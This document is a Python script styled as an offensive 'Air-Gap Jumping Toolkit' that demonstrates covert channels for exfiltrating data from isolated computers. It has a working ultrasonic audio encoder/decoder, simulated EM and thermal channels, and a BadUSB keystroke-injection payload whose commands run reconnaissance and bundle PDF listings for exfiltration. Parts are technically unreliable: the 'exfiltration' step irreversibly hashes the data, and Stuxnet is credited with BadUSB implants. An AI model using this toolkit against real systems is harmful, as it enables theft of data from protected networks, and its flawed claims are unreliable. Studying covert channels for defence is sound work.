#!/usr/bin/env python3
"""
Air-Gap Jumping Toolkit (AGJT)
Advanced covert channel communication for air-gapped networks

This toolkit demonstrates sophisticated techniques for bridging air-gaps:
1. Acoustic covert channels (ultrasonic data transmission)
2. Electromagnetic emanation exploitation (TEMPEST)
3. USB firmware implants (BadUSB)
4. Thermal covert channels (CPU temperature modulation)

Inspired by:
- Stuxnet (USB propagation across air-gap)
- NSA ANT catalog (hardware implants)
- Israeli operations (supply chain interdiction)
- Academic research (air-gap covert channels)

Author: General Hanis - Advanced Cyber Operations
Purpose: Educational demonstration of air-gap exploitation techniques
Warning: Highly advanced concepts - theoretical implementation for research
"""

import numpy as np
import struct
import time
import hashlib
from typing import List, Tuple
import wave

class AcousticCovertChannel:
    """
    Ultrasonic data transmission between air-gapped systems
    
    Concept: Modulate data into high-frequency audio (18-22 kHz)
    Transmitter: Use computer speakers to emit modulated signal
    Receiver: Use microphone on separate air-gapped computer
    
    Range: 20-30 feet in typical office environment
    Data rate: 1-10 bytes/second (very slow but works)
    
    Real-world usage: Extract data from air-gapped networks by encoding
    it in inaudible ultrasonic signals that traverse the physical gap
    """
    
    def __init__(self):
        self.sample_rate = 44100  # Standard audio sample rate
        self.carrier_freq_0 = 18000  # 18 kHz for binary 0
        self.carrier_freq_1 = 20000  # 20 kHz for binary 1
        self.bit_duration = 0.1  # 100ms per bit
        
        print("[Acoustic Channel] Initialized")
        print(f"  Carrier frequencies: {self.carrier_freq_0} Hz (0), {self.carrier_freq_1} Hz (1)")
        print(f"  Sample rate: {self.sample_rate} Hz")
        print(f"  Bit duration: {self.bit_duration}s")
    
    def encode_data_to_audio(self, data: bytes) -> np.ndarray:
        """
        Encode binary data into ultrasonic audio signal
        
        Process:
        1. Convert bytes to binary string
        2. For each bit:
           - 0 = 18 kHz tone
           - 1 = 20 kHz tone
        3. Generate audio waveform
        
        Args:
            data: Binary data to encode
            
        Returns:
            NumPy array of audio samples
        """
        # Convert data to binary string
        binary_str = ''.join(format(byte, '08b') for byte in data)
        
        print(f"\n[Encode] Data: {data.hex()}")
        print(f"[Encode] Binary: {binary_str}")
        print(f"[Encode] Total bits: {len(binary_str)}")
        
        # Calculate samples per bit
        samples_per_bit = int(self.sample_rate * self.bit_duration)
        
        # Generate audio signal
        audio_signal = np.array([], dtype=np.float32)
        
        for bit in binary_str:
            # Choose frequency based on bit value
            freq = self.carrier_freq_1 if bit == '1' else self.carrier_freq_0
            
            # Generate sine wave for this bit
            t = np.linspace(0, self.bit_duration, samples_per_bit, False)
            tone = np.sin(2 * np.pi * freq * t)
            
            # Add to signal
            audio_signal = np.concatenate([audio_signal, tone])
        
        print(f"[Encode] Generated {len(audio_signal)} audio samples")
        print(f"[Encode] Duration: {len(audio_signal) / self.sample_rate:.2f} seconds")
        
        return audio_signal
    
    def decode_audio_to_data(self, audio_signal: np.ndarray) -> bytes:
        """
        Decode ultrasonic audio signal back to binary data
        
        Process:
        1. Segment audio into bit-duration windows
        2. For each window:
           - Perform FFT to identify dominant frequency
           - 18 kHz = 0, 20 kHz = 1
        3. Convert binary to bytes
        
        Args:
            audio_signal: Audio samples to decode
            
        Returns:
            Decoded binary data
        """
        samples_per_bit = int(self.sample_rate * self.bit_duration)
        num_bits = len(audio_signal) // samples_per_bit
        
        print(f"\n[Decode] Processing {len(audio_signal)} samples")
        print(f"[Decode] Expected bits: {num_bits}")
        
        binary_str = ""
        
        for i in range(num_bits):
            # Extract window for this bit
            start = i * samples_per_bit
            end = start + samples_per_bit
            window = audio_signal[start:end]
            
            # Perform FFT to find dominant frequency
            fft = np.fft.fft(window)
            freqs = np.fft.fftfreq(len(window), 1/self.sample_rate)
            
            # Find peak frequency in ultrasonic range
            ultrasonic_mask = (freqs >= 17000) & (freqs <= 22000)
            ultrasonic_fft = np.abs(fft[ultrasonic_mask])
            ultrasonic_freqs = freqs[ultrasonic_mask]
            
            if len(ultrasonic_fft) > 0:
                peak_freq = ultrasonic_freqs[np.argmax(ultrasonic_fft)]
                
                # Determine bit value based on frequency
                bit = '1' if abs(peak_freq - self.carrier_freq_1) < abs(peak_freq - self.carrier_freq_0) else '0'
                binary_str += bit
        
        print(f"[Decode] Binary: {binary_str}")
        
        # Convert binary string to bytes
        data = bytearray()
        for i in range(0, len(binary_str), 8):
            if i + 8 <= len(binary_str):
                byte = int(binary_str[i:i+8], 2)
                data.append(byte)
        
        print(f"[Decode] Data: {bytes(data).hex()}")
        
        return bytes(data)
    
    def save_to_wav(self, audio_signal: np.ndarray, filename: str):
        """
        Save audio signal to WAV file for transmission
        
        In real operation:
        - Play WAV file through speakers on source computer
        - Record with microphone on air-gapped destination computer
        - Decode received audio to extract data
        """
        # Normalize to 16-bit range
        audio_normalized = np.int16(audio_signal * 32767)
        
        # Write WAV file
        with wave.open(filename, 'w') as wav_file:
            wav_file.setnchannels(1)  # Mono
            wav_file.setsampwidth(2)  # 16-bit
            wav_file.setframerate(self.sample_rate)
            wav_file.writeframes(audio_normalized.tobytes())
        
        print(f"[Audio] Saved to: {filename}")


class EMCovertChannel:
    """
    Electromagnetic emanation exploitation
    
    Concept: Computer components emit EM radiation that varies with operations
    Technique: Modulate computation to create detectable EM patterns
    Reception: Software-defined radio (SDR) receives and decodes patterns
    
    Based on TEMPEST research and NSA capabilities
    
    Real-world: Can exfiltrate data from Faraday-caged facilities
    Range: 10-50 feet depending on shielding and receiver sensitivity
    """
    
    def __init__(self):
        self.carrier_freq = 1.5e6  # 1.5 MHz (AM radio band)
        self.symbol_duration = 0.001  # 1ms per symbol
        
        print("[EM Channel] Initialized")
        print(f"  Target frequency: {self.carrier_freq / 1e6:.1f} MHz")
        print(f"  Symbol duration: {self.symbol_duration * 1000:.1f} ms")
    
    def generate_em_pattern(self, data: bytes) -> List[str]:
        """
        Generate CPU operation pattern that creates detectable EM emission
        
        Technique: Specific CPU operations create specific EM signatures
        Example: Repeated square root calculations create predictable pattern
        
        Returns: List of operations to execute for data transmission
        """
        operations = []
        
        # Convert data to binary
        binary_str = ''.join(format(byte, '08b') for byte in data)
        
        print(f"\n[EM Encode] Data: {data.hex()}")
        print(f"[EM Encode] Binary: {binary_str}")
        
        for bit in binary_str:
            if bit == '1':
                # High-intensity operation (creates stronger EM emission)
                operations.append("INTENSIVE_COMPUTE")
            else:
                # Low-intensity operation (minimal EM emission)
                operations.append("IDLE")
        
        print(f"[EM Encode] Generated {len(operations)} EM operations")
        
        return operations
    
    def execute_em_transmission(self, operations: List[str]):
        """
        Execute operations to create EM emissions
        
        WARNING: Theoretical demonstration only
        Real implementation requires precise timing and CPU control
        """
        print("\n[EM Transmit] Executing transmission sequence...")
        
        for i, op in enumerate(operations):
            if op == "INTENSIVE_COMPUTE":
                # Simulate intensive computation
                # Real implementation: Optimized assembly for consistent EM signature
                result = 0
                for _ in range(10000):
                    result += np.sqrt(np.random.random())
                
                print(f"  Bit {i}: 1 (INTENSIVE)", end='\r')
            else:
                # Idle period
                print(f"  Bit {i}: 0 (IDLE)", end='\r')
            
            # Precise timing critical for reception
            time.sleep(self.symbol_duration)
        
        print(f"\n[EM Transmit] Transmission complete ({len(operations)} bits)")


class USBFirmwareImplant:
    """
    BadUSB firmware implant for air-gap crossing
    
    Concept: Reprogram USB device firmware to act as keyboard
    Capability: When plugged in, types commands automatically
    Stealth: Appears as legitimate USB device (flash drive, mouse, etc.)
    
    Usage scenario:
    1. Compromise USB firmware of legitimate device
    2. Social engineer target to plug it into air-gapped system
    3. Device automatically executes payload via keystroke injection
    4. Can exfiltrate data back to device storage
    
    Real-world: Used in Stuxnet, available in commercial pen-test tools (Rubber Ducky)
    """
    
    def __init__(self):
        self.device_type = "USB Mass Storage + HID Keyboard"
        self.payload_commands = []
        
        print("[USB Implant] Initialized")
        print(f"  Device type: {self.device_type}")
    
    def create_payload(self, commands: List[str]) -> bytes:
        """
        Create payload that will be executed via keystroke injection
        
        Args:
            commands: List of commands to execute on target system
            
        Returns:
            Encoded payload for USB firmware
        """
        print(f"\n[USB Payload] Creating payload with {len(commands)} commands")
        
        payload_script = "#!/bin/bash\n" + "\n".join(commands)
        
        print("[USB Payload] Payload script:")
        print(payload_script)
        
        # In real implementation, this would be:
        # 1. Compiled to USB HID keystroke sequences
        # 2. Embedded in USB firmware
        # 3. Triggered on device insertion
        
        return payload_script.encode()
    
    def simulate_keystroke_injection(self, payload: bytes):
        """
        Simulate USB device typing commands
        
        Real device: Appears as keyboard, types at superhuman speed
        Target system: Executes commands as if administrator typed them
        """
        print("\n[USB Inject] Simulating keystroke injection...")
        print("[USB Inject] Device appears as USB keyboard")
        print("[USB Inject] Typing commands...")
        
        commands = payload.decode().split('\n')
        
        for i, cmd in enumerate(commands, 1):
            time.sleep(0.1)  # Simulate typing delay
            print(f"  [{i}] {cmd}")
        
        print("[USB Inject] Payload execution complete")
    
    def exfiltration_mode(self, data_to_exfiltrate: bytes):
        """
        Exfiltrate data from air-gapped system via USB device
        
        Method:
        1. Collect data on air-gapped system
        2. Encode and hide in USB device storage
        3. Remove device and read data externally
        """
        print(f"\n[USB Exfil] Exfiltrating {len(data_to_exfiltrate)} bytes")
        
        # Encode data (in reality: steganography in filesystem structures)
        encoded = hashlib.sha256(data_to_exfiltrate).hexdigest()
        
        print(f"[USB Exfil] Data encoded: {encoded}")
        print("[USB Exfil] Data hidden in USB device firmware/storage")
        print("[USB Exfil] Device ready for removal and data extraction")


class ThermalCovertChannel:
    """
    CPU temperature-based covert channel
    
    Concept: Modulate CPU load to change temperature
    Reception: Monitor temperature sensors remotely (if accessible)
    Or: Thermal camera detects heat patterns
    
    Extremely slow but works through physical isolation
    Used in research for Faraday cage bypass
    """
    
    def __init__(self):
        self.temp_0 = 40  # Target temp for bit 0 (°C)
        self.temp_1 = 50  # Target temp for bit 1 (°C)
        self.stabilization_time = 5  # Seconds for temp to stabilize
        
        print("[Thermal Channel] Initialized")
        print(f"  Temperature encoding: {self.temp_0}°C (0), {self.temp_1}°C (1)")
    
    def encode_thermal_pattern(self, data: bytes) -> List[int]:
        """
        Create CPU load pattern to modulate temperature
        
        Returns: List of target temperatures for each bit
        """
        binary_str = ''.join(format(byte, '08b') for byte in data)
        
        temps = []
        for bit in binary_str:
            target_temp = self.temp_1 if bit == '1' else self.temp_0
            temps.append(target_temp)
        
        print(f"\n[Thermal] Encoding {len(binary_str)} bits")
        print(f"[Thermal] Temperature pattern: {temps[:10]}... (showing first 10)")
        
        return temps
    
    def modulate_cpu_temperature(self, target_temps: List[int]):
        """
        Adjust CPU load to achieve target temperatures
        
        HIGH TEMP: Execute intensive computation
        LOW TEMP: Idle, allow CPU to cool
        
        Reception: Monitor temperature sensors or thermal imaging
        """
        print("\n[Thermal] Executing temperature modulation...")
        
        for i, target_temp in enumerate(target_temps):
            if target_temp >= self.temp_1:
                print(f"  Bit {i}: 1 (heating to {target_temp}°C)")
                # Intensive computation to heat CPU
                _ = sum(np.random.random(1000000))
            else:
                print(f"  Bit {i}: 0 (cooling to {target_temp}°C)")
                # Idle to allow cooling
                time.sleep(self.stabilization_time)
        
        print("[Thermal] Modulation complete")


# Demonstration
if __name__ == "__main__":
    print("="*70)
    print("AIR-GAP JUMPING TOOLKIT")
    print("Advanced Covert Channel Communication Demonstration")
    print("="*70)
    
    # Test data
    test_data = b"SECRET"
    print(f"\nTest data: {test_data}")
    print(f"Hex: {test_data.hex()}")
    
    print("\n" + "="*70)
    print("1. ACOUSTIC COVERT CHANNEL DEMONSTRATION")
    print("="*70)
    
    acoustic = AcousticCovertChannel()
    
    # Encode data to audio
    audio_signal = acoustic.encode_data_to_audio(test_data)
    acoustic.save_to_wav(audio_signal, "covert_transmission.wav")
    
    # Decode audio back to data
    decoded = acoustic.decode_audio_to_data(audio_signal)
    print(f"\nVerification: {'SUCCESS' if decoded == test_data else 'FAILED'}")
    
    print("\n" + "="*70)
    print("2. ELECTROMAGNETIC COVERT CHANNEL DEMONSTRATION")
    print("="*70)
    
    em_channel = EMCovertChannel()
    em_operations = em_channel.generate_em_pattern(test_data)
    em_channel.execute_em_transmission(em_operations[:16])  # First 16 bits only for demo
    
    print("\n" + "="*70)
    print("3. USB FIRMWARE IMPLANT DEMONSTRATION")
    print("="*70)
    
    usb_implant = USBFirmwareImplant()
    
    # Create malicious payload
    payload_commands = [
        "# Executed on air-gapped system",
        "whoami",
        "ifconfig | grep inet",
        "find / -name '*.pdf' > /tmp/documents.txt",
        "tar czf /tmp/exfil.tar.gz /tmp/documents.txt",
        "# Data ready for exfiltration"
    ]
    
    payload = usb_implant.create_payload(payload_commands)
    usb_implant.simulate_keystroke_injection(payload)
    usb_implant.exfiltration_mode(test_data)
    
    print("\n" + "="*70)
    print("4. THERMAL COVERT CHANNEL DEMONSTRATION")
    print("="*70)
    
    thermal = ThermalCovertChannel()
    thermal_pattern = thermal.encode_thermal_pattern(b"HI")  # Short message for demo
    thermal.modulate_cpu_temperature(thermal_pattern[:8])  # First byte only
    
    print("\n" + "="*70)
    print("DEMONSTRATION COMPLETE")
    print("="*70)
    print("\nOPERATIONAL NOTES:")
    print("• Acoustic: 1-10 bytes/sec, range 20-30 feet")
    print("• EM: Requires SDR receiver, range 10-50 feet")
    print("• USB: Social engineering required, high reliability")
    print("• Thermal: Extremely slow, works through Faraday cages")
    print("\nThese techniques demonstrate how nation-state actors bridge")
    print("air-gaps in high-security environments. Each method trades speed")
    print("for covertness and ability to bypass physical isolation.")
    print("="*70)
